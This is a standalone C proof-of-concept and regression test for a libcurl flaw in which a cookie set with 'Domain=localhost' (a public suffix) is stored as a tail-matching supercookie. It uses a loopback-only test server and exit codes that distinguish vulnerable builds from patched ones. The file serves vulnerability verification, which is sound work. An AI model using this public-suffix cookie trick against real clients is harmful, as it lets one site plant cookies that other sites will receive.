/*
 * PoC: CVE-2026-82209 / curl-psl-supercookie-tailmatch
 *
 * Standalone libcurl PoC (public API only, loopback network only).
 * An in-process HTTP server answers on 127.0.0.1 and the client requests
 * http://localhost:PORT/ (pinned to 127.0.0.1 via CURLOPT_RESOLVE).
 * libpsl lists "localhost" as a public suffix.
 *
 * Modes (argv[1]):
 *   psl-supercookie  server sets "Set-Cookie: flavor=bad; Domain=localhost"
 *                    VULNERABLE  -> cookie stored with tailmatch (domain
 *                                   field reported with a leading dot)
 *                    FIXED       -> tailmatch cleared (no leading dot)
 *   non-psl-control  Domain=poc.localhost (not a suffix): tailmatch retained
 *                    on BOTH original and patched builds (no regression).
 *
 * Exit codes: 0 = expectation met, 1 = expectation violated, 2 = transport
 * error (never treated as a verdict). Expectation is printed as
 * "CASE_OK <mode> tailmatch=<0|1>" for machine classification.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>

static int make_listener(uint16_t *port_out) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if(fd < 0) return -1;
  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;
  if(bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(fd); return -1; }
  socklen_t len = sizeof(addr);
  if(getsockname(fd, (struct sockaddr *)&addr, &len) < 0) { close(fd); return -1; }
  if(listen(fd, 1) < 0) { close(fd); return -1; }
  *port_out = ntohs(addr.sin_port);
  return fd;
}

struct server_cfg { int fd; const char *set_cookie; int served; };

static void *serve_once(void *arg) {
  struct server_cfg *cfg = (struct server_cfg *)arg;
  int c = accept(cfg->fd, NULL, NULL);
  if(c < 0) return NULL;
  char buf[4096];
  ssize_t n = recv(c, buf, sizeof(buf) - 1, 0);
  (void)n;
  char response[1024];
  int len = snprintf(response, sizeof(response),
      "HTTP/1.1 200 OK\r\n"
      "Content-Type: text/plain\r\n"
      "Set-Cookie: %s\r\n"
      "Content-Length: 2\r\n"
      "Connection: close\r\n"
      "\r\nhi", cfg->set_cookie);
  if(len > 0) (void)send(c, response, (size_t)len, 0);
  /* drain any second request (redirect/follow-ups none expected) */
  shutdown(c, SHUT_WR);
  close(c);
  cfg->served = 1;
  return NULL;
}

static size_t drop(void *ptr, size_t sz, size_t nm, void *ud) {
  (void)ptr; (void)ud; return sz * nm;
}

/* Returns 1 if any cookie's domain starts with '.', else 0; -1 on error. */
static int any_tailmatch_dot(struct curl_slist *cookies, const char *needle) {
  for(struct curl_slist *it = cookies; it; it = it->next) {
    /* Netscape line: domain \t flag \t path \t secure \t expiry \t name \t value */
    if(strncmp(it->data, needle, strlen(needle)) == 0 && it->data[0] == '.')
      return 1;
    if(it->data[0] == '.' && strstr(it->data, needle))
      return 1;
  }
  return 0;
}

int main(int argc, char **argv) {
  if(argc < 2) { fprintf(stderr, "usage: %s <psl-supercookie|non-psl-control>\n", argv[0]); return 2; }
  const char *mode = argv[1];
  const char *set_cookie;
  int expect_tailmatch;   /* what the ORIGINAL (vulnerable) build produces */
  if(strcmp(mode, "psl-supercookie") == 0) {
    set_cookie = "flavor=bad; Domain=localhost; Path=/";
    expect_tailmatch = 1;   /* vulnerable keeps tailmatch; fix clears it */
  } else if(strcmp(mode, "non-psl-control") == 0) {
    set_cookie = "flavor=good; Domain=poc.localhost; Path=/";
    expect_tailmatch = 1;   /* retained on both builds */
  } else { fprintf(stderr, "unknown mode\n"); return 2; }
  const int control_host = (strcmp(mode, "non-psl-control") == 0);
  const char *host = control_host ? "poc.localhost" : "localhost";

  uint16_t port = 0;
  int fd = make_listener(&port);
  if(fd < 0) { perror("listener"); return 2; }
  struct server_cfg cfg = { fd, set_cookie, 0 };
  pthread_t th;
  if(pthread_create(&th, NULL, serve_once, &cfg) != 0) { close(fd); return 2; }

  char url[128], resolve[64];
  snprintf(url, sizeof(url), "http://%s:%u/", host, (unsigned)port);
  snprintf(resolve, sizeof(resolve), "%s:%u:127.0.0.1", host, (unsigned)port);

  CURL *curl = curl_easy_init();
  if(!curl) { close(fd); return 2; }
  struct curl_slist *res = curl_slist_append(NULL, resolve);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_RESOLVE, res);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, drop);
  curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");  /* enable cookie engine */
  CURLcode rc = curl_easy_perform(curl);

  int verdict = -1;
  if(rc == CURLE_OK) {
    struct curl_slist *cookies = NULL;
    if(curl_easy_getinfo(curl, CURLINFO_COOKIELIST, &cookies) == CURLE_OK && cookies) {
      const char *needle = (strcmp(mode, "psl-supercookie") == 0) ? "localhost" : "poc.localhost";
      verdict = any_tailmatch_dot(cookies, needle);
      curl_slist_free_all(cookies);
    } else {
      verdict = -1;
    }
  }
  curl_slist_free_all(res);
  curl_easy_cleanup(curl);
  pthread_join(th, NULL);
  close(fd);

  if(verdict < 0) { fprintf(stderr, "no cookie observation\n"); return 2; }
  printf("CASE_OK %s tailmatch=%d\n", mode, verdict);
  /* Both modes: the ORIGINAL build must show tailmatch=1.
     The PATCHED build differs only in psl-supercookie (tailmatch=0). */
  return (verdict == expect_tailmatch) ? 0 : 1;
}
